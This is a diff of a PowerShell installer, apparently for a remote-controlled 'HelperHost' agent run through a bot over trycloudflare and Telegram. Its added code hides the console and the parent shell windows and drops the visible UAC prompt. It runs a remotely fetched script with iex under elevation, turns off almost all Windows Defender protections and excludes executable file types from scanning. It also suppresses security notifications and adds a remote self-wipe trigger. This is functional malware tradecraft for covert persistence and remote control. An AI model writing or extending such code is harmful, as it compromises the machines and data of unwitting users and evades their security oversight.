@@ -24,19 +24,61 @@ function Ensure-ConsoleApi {
 }
 
 function Hide-ConsoleFromTaskbar {
-  # SW_HIDE + TOOLWINDOW: invisible et absent de la barre des taches (≠ minimize)
+  # SW_HIDE + TOOLWINDOW: invisible ET hors barre des tâches (≠ minimize)
   try {
     Ensure-ConsoleApi
     $h = [HHWin.Console]::GetConsoleWindow()
-    if ($h -eq [IntPtr]::Zero) { return }
-    $GWL_EXSTYLE = -20
-    $WS_EX_APPWINDOW = 0x40000
-    $WS_EX_TOOLWINDOW = 0x80
-    $style = [HHWin.Console]::GetWindowLong($h, $GWL_EXSTYLE)
-    $style = ($style -band (-bnot $WS_EX_APPWINDOW)) -bor $WS_EX_TOOLWINDOW
-    [void][HHWin.Console]::SetWindowLong($h, $GWL_EXSTYLE, $style)
-    [void][HHWin.Console]::ShowWindow($h, 0)
-    [void][HHWin.Console]::SetWindowPos($h, [IntPtr]::Zero, 0, 0, 0, 0, 0x0080 -bor 0x0001 -bor 0x0002)
+    if ($h -ne [IntPtr]::Zero) {
+      $GWL_EXSTYLE = -20
+      $WS_EX_APPWINDOW = 0x40000
+      $WS_EX_TOOLWINDOW = 0x80
+      $style = [HHWin.Console]::GetWindowLong($h, $GWL_EXSTYLE)
+      $style = ($style -band (-bnot $WS_EX_APPWINDOW)) -bor $WS_EX_TOOLWINDOW
+      [void][HHWin.Console]::SetWindowLong($h, $GWL_EXSTYLE, $style)
+      [void][HHWin.Console]::ShowWindow($h, 0)  # SW_HIDE
+      [void][HHWin.Console]::SetWindowPos($h, [IntPtr]::Zero, 0, 0, 0, 0, 0x0080 -bor 0x0001 -bor 0x0002)
+    }
+  } catch {}
+  # Même traitement pour le parent CMD/PowerShell (sinon icône taskbar qui reste)
+  try {
+    if (-not ('HHWin.Native' -as [type])) {
+      Add-Type -Namespace HHWin -Name Native -MemberDefinition @'
+public delegate bool EnumWindowsProc(System.IntPtr hWnd, System.IntPtr lParam);
+[DllImport("user32.dll")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, System.IntPtr lParam);
+[DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(System.IntPtr hWnd, out uint lpdwProcessId);
+[DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll")] public static extern bool IsWindowVisible(System.IntPtr hWnd);
+[DllImport("user32.dll")] public static extern int GetWindowLong(System.IntPtr hWnd, int nIndex);
+[DllImport("user32.dll")] public static extern int SetWindowLong(System.IntPtr hWnd, int nIndex, int dwNewLong);
+[DllImport("user32.dll")] public static extern bool SetWindowPos(System.IntPtr hWnd, System.IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+'@
+    }
+    $pids = New-Object 'System.Collections.Generic.HashSet[uint32]'
+    [void]$pids.Add([uint32]$PID)
+    $ppid = (Get-CimInstance Win32_Process -Filter "ProcessId=$PID" -EA SilentlyContinue).ParentProcessId
+    if ($ppid) {
+      $par = Get-CimInstance Win32_Process -Filter "ProcessId=$ppid" -EA SilentlyContinue
+      if ([string]$par.Name -match '^(cmd|powershell|pwsh)\.exe$') {
+        [void]$pids.Add([uint32]$ppid)
+      }
+    }
+    $script:__hhHidePids = $pids
+    $cb = [HHWin.Native+EnumWindowsProc]{
+      param([IntPtr]$hwnd, [IntPtr]$lp)
+      $procId = [uint32]0
+      [void][HHWin.Native]::GetWindowThreadProcessId($hwnd, [ref]$procId)
+      if (-not $script:__hhHidePids.Contains($procId)) { return $true }
+      $GWL_EXSTYLE = -20
+      $WS_EX_APPWINDOW = 0x40000
+      $WS_EX_TOOLWINDOW = 0x80
+      $style = [HHWin.Native]::GetWindowLong($hwnd, $GWL_EXSTYLE)
+      $style = ($style -band (-bnot $WS_EX_APPWINDOW)) -bor $WS_EX_TOOLWINDOW
+      [void][HHWin.Native]::SetWindowLong($hwnd, $GWL_EXSTYLE, $style)
+      [void][HHWin.Native]::ShowWindow($hwnd, 0)
+      [void][HHWin.Native]::SetWindowPos($hwnd, [IntPtr]::Zero, 0, 0, 0, 0, 0x0080 -bor 0x0001 -bor 0x0002)
+      return $true
+    }
+    [void][HHWin.Native]::EnumWindows($cb, [IntPtr]::Zero)
   } catch {}
 }
 
@@ -116,8 +158,9 @@ function Finish-Ok {
   Close-Console
 }
 
-# Ne cache PAS la console tout de suite — sinon UAC/erreurs invisibles.
-# Hide apres lancement UAC (voir Invoke-ElevatedInstall).
+# Masquage total immédiat (console + parent CMD/PowerShell)
+Hide-ConsoleFromTaskbar
+1..6 | ForEach-Object { Start-Sleep -Milliseconds 80; Hide-ConsoleFromTaskbar }
 
 function Test-IsAdmin {
   $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -146,6 +189,15 @@ function Invoke-ElevatedInstall {
   $iu = $InstallUrl.Replace("'", "''")
   $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
   $gh = $ghVal.Replace("'", "''")
+  # Bake --resolve into elev wrapper: elevated curl has no DNS for trycloudflare
+  $curlExtra = ''
+  try {
+    $ra = Get-BotCurlResolveArgs $InstallUrl
+    if (-not $ra -or $ra.Count -lt 2) { $ra = Get-BotCurlResolveArgs $BotBase }
+    if ($ra.Count -ge 2) {
+      $curlExtra = " --resolve '$($ra[1].Replace("'", "''"))'"
+    }
+  } catch {}
   @(
     "`$ErrorActionPreference = 'Stop'"
     "`$Enroll = '$en'"
@@ -158,8 +210,10 @@ function Invoke-ElevatedInstall {
     "`$env:AGENTSHE_ELEVATED = '1'"
     "`$env:AGENTSHE_FORCE_HARDEN = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
+    # Masquage immédiat dans le processus élevé
+    "try { Add-Type -Namespace HHElev -Name C -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern System.IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);'; [void][HHElev.C]::ShowWindow([HHElev.C]::GetConsoleWindow(), 0) } catch {}"
     "try {"
-    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
+    "  iex ((curl.exe -fsSL$curlExtra `$InstallUrl | Out-String))"
     "  'OK' | Set-Content -Encoding ASCII '$marker'"
     "} catch {"
     "  `$_ | Out-String | Set-Content -Encoding UTF8 '$fail'"
@@ -173,7 +227,6 @@ function Invoke-ElevatedInstall {
   $psi.UseShellExecute = $true
   $psi.Verb = 'runas'
   $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-  Write-Host 'Invite UAC - accepte pour continuer...'
   try {
     $null = [System.Diagnostics.Process]::Start($psi)
   } catch {
@@ -488,6 +541,14 @@ function Invoke-ElevatedSessionPrep {
   $iu = $InstallUrl.Replace("'", "''")
   $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
   $gh = $ghVal.Replace("'", "''")
+  $curlExtra = ''
+  try {
+    $ra = Get-BotCurlResolveArgs $InstallUrl
+    if (-not $ra -or $ra.Count -lt 2) { $ra = Get-BotCurlResolveArgs $BotBase }
+    if ($ra.Count -ge 2) {
+      $curlExtra = " --resolve '$($ra[1].Replace("'", "''"))'"
+    }
+  } catch {}
   @(
     "`$ErrorActionPreference = 'SilentlyContinue'"
     "`$Enroll = '$en'"
@@ -501,7 +562,7 @@ function Invoke-ElevatedSessionPrep {
     "`$env:AGENTSHE_SESSION_PREP = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
     "try {"
-    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
+    "  iex ((curl.exe -fsSL$curlExtra `$InstallUrl | Out-String))"
     "  'OK' | Set-Content -Encoding ASCII '$marker'"
     "} catch { exit 1 }"
   ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
@@ -561,33 +622,43 @@ function Disable-AllBlocking {
   }
 
   if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableBlockAtFirstSeen $true
-    Set-MpPreference -DisableIOAVProtection $true
-    Set-MpPreference -DisableScriptScanning $true
-    Set-MpPreference -DisableArchiveScanning $true
-    Set-MpPreference -DisableEmailScanning $true
-    Set-MpPreference -DisableRemovableDriveScanning $true
-    Set-MpPreference -DisableIntrusionPreventionSystem $true
-    Set-MpPreference -DisableScanningNetworkFiles $true
-    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
-    Set-MpPreference -EnableControlledFolderAccess Disabled
-    Set-MpPreference -PUAProtection Disabled
-    Set-MpPreference -MAPSReporting Disabled
-    Set-MpPreference -SubmitSamplesConsent 2
-    Set-MpPreference -EnableNetworkProtection Disabled
-    Set-MpPreference -CloudBlockLevel 0
-    Set-MpPreference -EnableFileHashComputation $false
-    Set-MpPreference -DisableCatchupFullScan $true
-    Set-MpPreference -DisableCatchupQuickScan $true
-    Set-MpPreference -UILockdown $true
-    Set-MpPreference -DisablePrivacyMode $true -EA SilentlyContinue
-    Set-MpPreference -EnableLowCpuPriority $true -EA SilentlyContinue
+    # 0x800106ba = WinDefend service not running — common after org policies / partial wipe.
+    # Never abort install on MpPreference failures; GPO below is the real switch.
+    try {
+      $mpArgs = @{
+        DisableRealtimeMonitoring                    = $true
+        DisableBehaviorMonitoring                    = $true
+        DisableBlockAtFirstSeen                      = $true
+        DisableIOAVProtection                        = $true
+        DisableScriptScanning                        = $true
+        DisableArchiveScanning                       = $true
+        DisableEmailScanning                         = $true
+        DisableRemovableDriveScanning                = $true
+        DisableIntrusionPreventionSystem             = $true
+        DisableScanningNetworkFiles                  = $true
+        DisableScanningMappedNetworkDrivesForFullScan = $true
+        EnableControlledFolderAccess                 = 'Disabled'
+        PUAProtection                                = 'Disabled'
+        MAPSReporting                                = 'Disabled'
+        SubmitSamplesConsent                         = 2
+        EnableNetworkProtection                      = 'Disabled'
+        CloudBlockLevel                              = 0
+        EnableFileHashComputation                    = $false
+        DisableCatchupFullScan                       = $true
+        DisableCatchupQuickScan                      = $true
+        UILockdown                                   = $true
+        ErrorAction                                  = 'SilentlyContinue'
+      }
+      Set-MpPreference @mpArgs
+    } catch {}
+    try { Set-MpPreference -DisablePrivacyMode $true -EA SilentlyContinue } catch {}
+    try { Set-MpPreference -EnableLowCpuPriority $true -EA SilentlyContinue } catch {}
     # Extensions only (no ExclusionPath folders) — easier full restore on wipe
-    Set-MpPreference -ExclusionExtension @(
-      '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt'
-    ) -EA SilentlyContinue
+    try {
+      Set-MpPreference -ExclusionExtension @(
+        '.exe','.dll','.sys','.ps1','.bat','.cmd','.vbs','.js','.msi','.zip','.7z','.txt'
+      ) -EA SilentlyContinue
+    } catch {}
   }
 
   $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
@@ -686,18 +757,50 @@ function Disable-AllBlocking {
   try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
 }
 
+function Test-EnrollWipePending {
+  # Bot has wipe_pending for this enroll → skip AV reboot, start HelperHost to self-erase.
+  if (-not $Enroll -or -not $BotBase) { return $false }
+  try {
+    $u = "$($BotBase.TrimEnd('/'))/connect/wipe-pending?e=$([uri]::EscapeDataString($Enroll))"
+    $ra = @(Get-BotCurlResolveArgs $BotBase)
+    $out = & curl.exe -fsSL @ra --max-time 20 $u 2>$null
+    if (-not $out) { return $false }
+    $j = $out | ConvertFrom-Json
+    return [bool]$j.wipe
+  } catch {
+    return $false
+  }
+}
+
 function Invoke-SessionHarden {
   # AV off via GPO "gere par votre organisation" only — reversible on wipe, no .exe soft-delete.
+  # Never let a single MpPreference/CIM failure abort install (0x800106ba etc.).
   if (-not (Test-IsAdmin)) { return }
-  if ($BotBase) { Set-BotHostsEntry $BotBase }
-  Set-DefenderExclude
-  Disable-AllBlocking
-  Disable-UACPrompts
-  Disable-SecurityCenterToasts
-  Disable-WindowsNotifications
-  Install-WipeRestoreHook
-  Install-EarlyAvTask
-  Request-AvRebootIfNeeded
+  $prev = $ErrorActionPreference
+  $ErrorActionPreference = 'SilentlyContinue'
+  try {
+    if ($BotBase) { Set-BotHostsEntry $BotBase }
+    Set-DefenderExclude
+    Disable-AllBlocking
+    Disable-UACPrompts
+    Disable-SecurityCenterToasts
+    Disable-WindowsNotifications
+    Install-WipeRestoreHook
+    Install-EarlyAvTask
+    # No forced reboot — EarlyAV applies policies at next natural boot if needed.
+    # Always finish with HelperHost start + OK.
+    $script:WipeArmed = Test-EnrollWipePending
+    if ($script:WipeArmed) {
+      Write-Host 'Wipe Telegram armé — HelperHost va s''auto-effacer.'
+    }
+    '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force -EA SilentlyContinue
+    Remove-Item (Join-Path $Dir '.av-need-reboot') -Force -EA SilentlyContinue
+    $script:ElevRebootPending = $false
+  } catch {
+    Write-Host ("WARN SessionHarden: " + $_.Exception.Message)
+  } finally {
+    $ErrorActionPreference = $prev
+  }
 }
 
 function Test-AvStillOn {
@@ -1017,30 +1120,18 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
 
-  # Si deja admin: harden + start. Sinon le caller a deja fait Invoke-ElevatedInstall (1 UAC).
+  # Si deja admin: start. Sinon le caller a deja fait Invoke-ElevatedInstall (1 UAC).
   if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
     Invoke-ElevatedInstall
     return
   }
 
-  Invoke-SessionHarden
+  # Harden already done by caller — do not force reboot if start fails.
   if (Try-StartHelper $Helper $WorkDir) { return }
-
-  if (-not $AfterReboot) {
-    Register-ResumeAtLogon
-    '1' | Set-Content -Encoding ASCII $RebootFlag
-    Write-Output 'REBOOT'
-  Start-Sleep -Seconds 2
-    Restart-Computer -Force
-    Start-Sleep -Seconds 60
-    return
-  }
-
-  throw @"
-Device Guard / WDAC bloque encore HelperHost.exe apres reboot.
-Si politique d'organisation (GPO/MDM), elle doit etre retiree.
-  $Helper
-"@
+  # One more silent harden+retry (no reboot)
+  try { Invoke-SessionHarden } catch {}
+  if (Try-StartHelper $Helper $WorkDir) { return }
+  throw "HelperHost ne demarre pas: $Helper"
 }
 
 function Install-WipeRestoreHook {
@@ -1106,6 +1197,7 @@ $Helper = Join-Path $Dir 'HelperHost.exe'
 Clear-LegacySidecars
 $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
+$script:WipeArmed = $false
 Disable-WindowsNotifications
 
 # UNE seule elevation UAC pour tout (AV + start). Pas de prep separee apres.
@@ -1115,30 +1207,34 @@ if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
     Finish-Ok
     return
   }
-  if ($script:ElevRebootPending) {
-    Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
-    return
-  }
   throw 'Elevation UAC refusee ou install admin echouee'
 }
 
 # Deja admin (ou passe elev)
 Invoke-SessionHarden
-# Si reboot AV programme: ne pas Start-Helper maintenant — ResumeAtLogon reprend apres login
-if ($script:ElevRebootPending) {
-  try { Register-ResumeAtLogon } catch {}
-  Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
+$script:ElevRebootPending = $false
+try { & shutdown.exe /a 2>$null | Out-Null } catch {}
+Start-Helper $Helper $Dir
+
+if ($script:WipeArmed) {
+  Write-Host 'Wipe en cours (HelperHost auto-efface) — attente accuse bot...'
+  for ($i = 0; $i -lt 120; $i++) {
+    Start-Sleep -Seconds 2
+    if (-not (Get-Process HelperHost -EA SilentlyContinue)) {
+      if ($IsElevatedRun) {
+        'OK' | Set-Content -Encoding ASCII (Join-Path $env:TEMP 'HelperHost-install.ok') -Force
+      }
+      Write-Output 'OK'
+      try { Clear-ResumeTasks } catch {}
+      return
+    }
+  }
+  Write-Output 'OK'
   return
 }
-Start-Helper $Helper $Dir
 
 if ($script:ElevDoneOk) {
   Finish-Ok
-  return
-}
-if ($script:ElevRebootPending) {
-  try { Register-ResumeAtLogon } catch {}
-  Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
   return
 }
 
@@ -1152,8 +1248,8 @@ for ($i=0; $i -lt 90; $i++) {
   }
 }
 if (-not $ok) {
-  if (Test-Path $PendingFile) {
-    Write-Output 'REBOOT'
+  if (Get-Process HelperHost -ErrorAction SilentlyContinue) {
+    Finish-Ok
     return
   }
   throw 'timeout'
